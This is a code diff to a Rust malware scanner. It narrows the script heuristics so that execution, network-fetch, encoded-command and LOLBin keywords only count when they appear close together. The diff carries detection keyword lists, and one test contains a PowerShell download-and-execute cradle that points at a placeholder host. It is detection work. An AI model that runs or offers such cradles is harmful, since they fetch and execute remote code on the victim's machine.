@@ -1187,11 +1187,32 @@ fn analyze_script(bytes: &[u8], sample_limit: usize, evidence: &mut Vec<Evidence
     };
     let lower = text.to_ascii_lowercase();
 
-    let has_encoded_command = contains_any(
-        &lower,
-        &["-encodedcommand", "-encoded command", "frombase64string("],
-    ) || (contains_any(&lower, &["powershell", "pwsh"])
-        && contains_long_base64_token(&text, 200));
+    const EXECUTION: &[&str] = &[
+        "invoke-expression",
+        "iex(",
+        "eval(",
+        "execute(",
+        "executeglobal(",
+    ];
+    const NETWORK: &[&str] = &[
+        "downloadstring(",
+        "downloadfile(",
+        "invoke-webrequest",
+        "invoke-restmethod",
+        "xmlhttp",
+        "winhttp.winhttprequest",
+        "http://",
+        "https://",
+    ];
+    const ENCODED: &[&str] = &["-encodedcommand", "-encoded command", "frombase64string("];
+    // A dropper does its work in a few lines. The same words far apart in a big file are source
+    // code or a bundle that happens to mention a URL and an `eval`, and flagging that is how a
+    // pnpm release came to look like malware.
+    const NEARBY: usize = 600;
+
+    let has_long_encoded_payload =
+        contains_any(&lower, &["powershell", "pwsh"]) && contains_long_base64_token(&text, 200);
+    let has_encoded_command = contains_any(&lower, ENCODED) || has_long_encoded_payload;
     if has_encoded_command {
         push_evidence(
             evidence,
@@ -1202,30 +1223,10 @@ fn analyze_script(bytes: &[u8], sample_limit: usize, evidence: &mut Vec<Evidence
         );
     }
 
-    let expression_execution = contains_any(
-        &lower,
-        &[
-            "invoke-expression",
-            "iex(",
-            "eval(",
-            "execute(",
-            "executeglobal(",
-        ],
-    );
-    let network_fetch = contains_any(
-        &lower,
-        &[
-            "downloadstring(",
-            "downloadfile(",
-            "invoke-webrequest",
-            "invoke-restmethod",
-            "xmlhttp",
-            "winhttp.winhttprequest",
-            "http://",
-            "https://",
-        ],
-    );
-    if expression_execution && network_fetch {
+    let expression_execution = contains_any(&lower, EXECUTION);
+    let download_and_execute = near(&lower, EXECUTION, NETWORK, NEARBY);
+    let decode_and_execute = near(&lower, EXECUTION, ENCODED, NEARBY);
+    if download_and_execute {
         push_evidence(
             evidence,
             "script.download_and_execute",
@@ -1233,7 +1234,7 @@ fn analyze_script(bytes: &[u8], sample_limit: usize, evidence: &mut Vec<Evidence
             42,
             "script combines network retrieval with dynamic expression execution".to_owned(),
         );
-    } else if expression_execution && has_encoded_command {
+    } else if decode_and_execute {
         push_evidence(
             evidence,
             "script.decode_and_execute",
@@ -1262,11 +1263,10 @@ fn analyze_script(bytes: &[u8], sample_limit: usize, evidence: &mut Vec<Evidence
         );
     }
 
-    let lolbin = contains_any(
-        &lower,
-        &["mshta", "regsvr32", "rundll32", "certutil", "bitsadmin"],
-    );
-    if lolbin && (network_fetch || has_encoded_command) {
+    const LOLBINS: &[&str] = &["mshta", "regsvr32", "rundll32", "certutil", "bitsadmin"];
+    let lolbin_delivery =
+        near(&lower, LOLBINS, NETWORK, NEARBY) || near(&lower, LOLBINS, ENCODED, NEARBY);
+    if lolbin_delivery {
         push_evidence(
             evidence,
             "script.lolbin_delivery",
@@ -1281,7 +1281,10 @@ fn analyze_script(bytes: &[u8], sample_limit: usize, evidence: &mut Vec<Evidence
         .chars()
         .filter(|character| matches!(character, '`' | '^'))
         .count();
-    if obfuscation_characters >= 16 && (expression_execution || has_encoded_command) {
+    if obfuscation_characters >= 16
+        && expression_execution
+        && (download_and_execute || decode_and_execute || has_encoded_command)
+    {
         push_evidence(
             evidence,
             "script.token_obfuscation",
@@ -1293,7 +1296,7 @@ fn analyze_script(bytes: &[u8], sample_limit: usize, evidence: &mut Vec<Evidence
         );
     }
 
-    if contains_any(&lower, &["[char[]]", "[char]", "-join"]) && expression_execution {
+    if near(&lower, EXECUTION, &["[char[]]", "[char]", "-join"], NEARBY) {
         push_evidence(
             evidence,
             "script.constructed_expression",
@@ -1302,6 +1305,29 @@ fn analyze_script(bytes: &[u8], sample_limit: usize, evidence: &mut Vec<Evidence
             "script constructs character data before dynamic execution".to_owned(),
         );
     }
+}
+
+/// Whether some occurrence of one of `left` is within `window` bytes of one of `right`.
+fn near(haystack: &str, left: &[&str], right: &[&str], window: usize) -> bool {
+    const MOST_POSITIONS: usize = 200_000;
+    let positions = |needles: &[&str]| {
+        let mut all: Vec<usize> = needles
+            .iter()
+            .flat_map(|needle| haystack.match_indices(needle).map(|(at, _)| at))
+            .take(MOST_POSITIONS)
+            .collect();
+        all.sort_unstable();
+        all
+    };
+    let (left, right) = (positions(left), positions(right));
+    left.iter().any(|at| {
+        let nearest = right.partition_point(|other| other < at);
+        right.get(nearest).is_some_and(|other| other - at <= window)
+            || nearest
+                .checked_sub(1)
+                .and_then(|before| right.get(before))
+                .is_some_and(|other| at - other <= window)
+    })
 }
 
 fn analyze_pdf(bytes: &[u8], evidence: &mut Vec<Evidence>) {
@@ -1579,6 +1605,30 @@ mod tests {
         assert_eq!(report.verdict, Verdict::Suspicious);
         assert_ne!(report.verdict, Verdict::Malicious);
         assert!(report.risk_score >= DEFAULT_SUSPICIOUS_THRESHOLD);
+        assert!(report
+            .evidence
+            .iter()
+            .any(|item| item.code == "script.download_and_execute"));
+    }
+
+    #[test]
+    fn mentioning_a_url_and_an_eval_far_apart_is_not_a_downloader() {
+        // A big script or bundle that has both words, a page of code apart.
+        let filler = "x = compute(values)\n".repeat(200);
+        let text = format!(
+            "# docs: see https://example.invalid/manual\n{filler}result = eval(expression)\n"
+        );
+        let report = ScanEngine::default().scan_bytes(text.as_bytes());
+        assert_eq!(report.verdict, Verdict::Clean, "{:?}", report.evidence);
+        assert!(!report
+            .evidence
+            .iter()
+            .any(|item| item.code == "script.download_and_execute"));
+
+        // The same two together are the pattern.
+        let together =
+            "x = 1\nIEX((New-Object Net.WebClient).DownloadString('http://example.invalid/a'))\n";
+        let report = ScanEngine::default().scan_bytes(together.as_bytes());
         assert!(report
             .evidence
             .iter()
